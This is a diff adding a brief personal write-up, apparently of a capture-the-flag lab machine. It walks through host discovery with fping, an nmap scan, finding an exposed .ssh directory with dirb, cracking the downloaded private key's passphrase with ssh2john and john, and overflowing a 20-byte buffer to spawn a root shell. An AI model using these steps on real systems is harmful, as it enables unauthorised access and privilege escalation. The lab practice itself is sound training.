@@ -1,0 +1,22 @@
+#enumeration 
+I used fping -aqg 192.168.56.1/24
+got it's address a 192.168.56.104
+ used nmap and found ports :
+ 	22
+ 	80 
+ 	and 31337 
+
+did dirb http://$IP
+ and found hidden page on 31337 called .ssh
+ downloaded all files from that page
+ used 
+ 	ssh2john id_rsa > result 
+ 	john result
+ 	and the id_rsa password as STARWARS
+ 	 logged in moved to root
+ 	 found a *.c file
+ 	 read it and saw it used strcmp()
+ 	 and buffer size of 20
+ 	 wanted Simon as input but i put in Simona*(15)/bin/sh
+ 	 spawned a shell 
+ 	 got the root flag
